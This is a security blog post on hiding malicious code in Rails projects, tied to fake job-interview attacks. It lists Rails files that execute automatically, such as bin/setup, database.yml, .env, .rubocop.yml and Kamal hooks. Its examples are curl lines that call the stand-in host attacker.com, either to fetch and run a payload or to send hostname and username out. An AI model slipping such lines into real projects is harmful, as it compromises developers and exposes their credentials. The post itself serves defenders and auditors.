---
title: "Hiding Malicious Code in a Rails Project"
description: "Rails' developer-friendly structure and extensive boilerplate create a large surface for hiding malicious code in plain sight. A walkthrough of the attack vectors that make Rails a prime target for developer-facing attacks."
date: 2026-07-17
category: appsec
preview: images/banner.png
keywords:
  - rails
  - ruby
  - supply chain
  - developer security
  - malicious code
  - contagious interview
  - north korea
  - lazarus
  - attack vectors
  - appsec
  - gemfile
  - dotenv
  - rubocop
  - living off the code
draft: false
lastmod: '2026-07-17T00:00:00.000Z'
type: post
---

Rails is one of those frameworks that almost everyone in the web development world has an opinion about. The people who love it praise the convention-over-configuration philosophy, the integrated tooling, the speed of going from idea to working application. The people who dislike it complain about the magic, the overhead, the opinionated structure. Both views are have their merits.

But there's one thing that's hard to dispute: the developer experience of working with Rails is fantastic. It's arguably the most complete web framework available today. Run `rails new` and you get database integration, background jobs, email, caching, asset pipelines, and a test suite all wired together and working before you've written a single line of your own code. For a developer picking up a new Rails project, or reviewing one as part of a job interview, that completeness is great.

That completeness is also exactly what makes Rails such an effective target for developer-facing attacks.

[I've written before about how developers have become prime targets in the modern threat landscape](/protecting-developers-from-supply-chain-attacks/), and how North Korea's Lazarus Group has been running their "Contagious Interview" campaign, where a fake recruiter sends a coding assessment containing a project rigged to execute malware the moment a developer opens or runs it. The technique works because the attacker hides their payload inside the development tooling itself: VS Code tasks, git hooks, package manager scripts. The developer isn't installing anything suspicious; they're just doing what the role requires: reviewing the code.

For Node.js and Python projects, the attack surface has been well documented. Rails has received less attention in this context, which is a problem, because the framework's structure creates an unusually large surface for hiding code in places that look completely normal.

## The Advantage Rails Gives an Attacker

When you run `rails new myapp`, you get roughly 60 files. A significant portion are configuration and scaffolding files that Rails generates and maintains. Files that most developers ignore unless something needs changing.

This is the foundation of the attack. A malicious Rails project doesn't need to introduce any new or obviously suspicious files. It just needs to hide a payload inside the files that are already expected to be there.

## Configuration and Binary Files

The `bin/` directory in a Rails project contains Ruby wrapper scripts: `bin/rails`, `bin/rake`, `bin/setup`, `bin/dev`, etc. They invoke Rails tooling; they're not application logic. Nobody reviews them unless something breaks.

Because they're plain executable files, they execute whatever code they contain. A single backtick expression buried at the bottom of `bin/setup` runs when a developer follows the standard "clone and run setup" onboarding flow which is usually the first thing a candidate does when they receive an interview project:

```ruby
#!/usr/bin/env ruby
require "fileutils"

# ... legitimate setup code ...

`curl -s https://attacker.com/payload | sh`
```

The same applies to the `config/` directory. `config/environment.rb`, `config/application.rb`, `config/boot.rb`, and all the environment-specific files under `config/environments/` are loaded as part of normal Rails boot. Running the server, opening a console, running a test. All of these trigger the load chain. A payload here runs before the app does anything visible:

```ruby
# config/environment.rb
require_relative "application"
Rails.application.initialize!

`curl https://attacker.com/?h=#{`hostname`}`
```

The initializers under `config/initializers/` are particularly low-scrutiny. They're meant to be small declarative setup snippets, which is exactly the kind of file where a one-liner disappears into surrounding noise.

The complete list of `bin/` and `config/` files that execute automatically is documented at [Living off the Code](https://luisfontes19.github.io/living-off-the-code/#ruby-rails-config-files).

## YAML Config Files with ERB

The above files are Ruby, so the risk is intuitive once you're thinking about it. The less obvious category is the YAML configuration files.

Rails processes several of its YAML configuration files through ERB before parsing them. The design intention is developer convenience: you can reference environment variables and perform basic computation inside what would otherwise be static config. The practical consequence is that these files can execute arbitrary Ruby code, including shell commands.

```yaml
# config/database.yml
default: &default
  adapter: sqlite3
  max_connections: <% `curl -s https://attacker.com/` %><%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000
```

The `<% %>` block executes and its output is discarded; the `<%= %>` produces the actual value. The backtick expression runs a shell command. The YAML still parses correctly. Rails loads `config/database.yml` on the first database connection, which typically happens on the first request or the first `rails db:migrate` command a candidate runs to set up their environment.

Files subject to ERB evaluation include `config/database.yml`, `config/cable.yml`, `config/cache.yml`, and `config/secrets.yml`. Any file loaded via `Rails.application.config_for(:name)` is also ERB-evaluated and exploitable through the same mechanism.

## The dotenv Gem

Rails applications almost universally use dotenv to load environment variables from `.env` files. The gem integrates via the `before_configuration` callback and loads automatically on every Rails boot, no extra code required in the application.

What's less widely known is that dotenv supports command substitution. A `$(command)` expression inside a `.env` file value is passed to the shell for evaluation, and the result is assigned to the variable at load time:

```bash
# .env
KEY=$(curl "https://attacker.com/")
```

The `curl` executes the moment Rails reads the file. The variable gets assigned whatever the command returns, so the file continues to function as a legitimate dotenv config from the application's perspective.

Rails loads `.env` files automatically and loads different files based on the environment (`RAILS_ENV`), which means there are multiple entry points for this technique: `.env`, `.env.development`, `.env.test`. The payload fires on server start, test run, and console open.

## RuboCop Configuration

RuboCop is the standard Ruby linter and formatter. In any active Rails project it's present almost by default. IDEs with Ruby support invoke it automatically on file save; pre-commit hooks run it on every commit; CI pipelines run it on every push.

RuboCop processes its configuration file through ERB before parsing it. The intent is the same as Rails YAML. The result is the same: arbitrary Ruby executes the moment RuboCop reads its configuration, which happens constantly and automatically.

```yaml
# .rubocop.yml
inherit_gem: { rubocop-rails-omakase: rubocop.yml <% `curl https://attacker.com/` %>}

# Overwrite or add rules to create your own house style
#
# Layout/SpaceInsideArrayLiteralBrackets:
#   Enabled: false
```

RuboCop searches for configuration by walking up from the linted file, loading `.rubocop.yml`, `.config/.rubocop.yml`, or `.config/rubocop/config.yml`. Any of these in a repository root are loaded automatically on every linter invocation which in an active development session means continuously.

## The Gemfile

The Gemfile uses a DSL but it's evaluated as pure Ruby. Any Ruby expression in the file runs on every `bundle install`, `bundle check`, and `bundle lock`, before any gems are fetched, before anything else in the install process.

## Kamal Hooks and Secrets

Worth including because it's Rails-first: [Kamal](https://kamal-deploy.org/), the official Rails deployment tool, introduces two additional code execution vectors.

Hook scripts placed under `.kamal/hooks/` are executed directly by Kamal on the deploying machine at specific points in the deploy lifecycle `pre-deploy`, `post-deploy`, `pre-build`, and others. These are shell scripts committed to the repository and run automatically on the machine performing the deploy, typically a developer workstation or a CI runner with access to deploy credentials, SSH keys, and cloud provider tokens.

```bash
#!/usr/bin/env sh
# .kamal/hooks/pre-deploy

curl -s "https://attacker.com/exfil?h=$(hostname)&u=$(whoami)"
```

The `.kamal/secrets` file is parsed using dotenv, which means the command substitution technique applies there as well. Every `kamal deploy` reads that file, which executes any embedded shell commands before the deploy begins.

This gets even better as Kamal [may be able to retrieve secrets](https://kamal-deploy.org/docs/commands/secrets/) from safe places like multiple password managers, AWS Secrets Manager, and HashiCorp Vault. If the attacker can get a payload into `.kamal/secrets`, they can exfiltrate secrets from any of those sources.

## Why Rails in Particular

Most of these techniques exist in other ecosystems. Node.js has `package.json` lifecycle scripts. Python has `.pth` files. What sets Rails apart is the volume of boilerplate and the predictability of the structure.

Every Rails project has a `config/database.yml`. Every Rails project has a `config/environment.rb`. Every Rails project has a `Gemfile`. An attacker who understands the Rails directory structure knows exactly where to place a payload that will execute reliably, hidding the code in plain sight, but still hard to find. The expected files are already there, most of the times ignored. They just need something added.

The predictability that makes Rails onboarding seamless is exactly what makes it a reliable target. And because these files are boilerplate, they receive less scrutiny than application code. Developers reviewing a Rails project for an interview exercise focus on the application logic: the models, controllers, business logic, tests. The configuration files are background noise.

We need to start auditing Rails projects from untrusted sources with the same attention given to application code.

The techniques covered here are fully documented at [Living off the Code](https://luisfontes19.github.io/living-off-the-code/), a project I've been working to catalogue attack vectors that hide in development tooling.

[Watchtower](https://marketplace.visualstudio.com/items?itemName=luisfontes19.watchtower), is the VS Code extension built to detect these attacks.
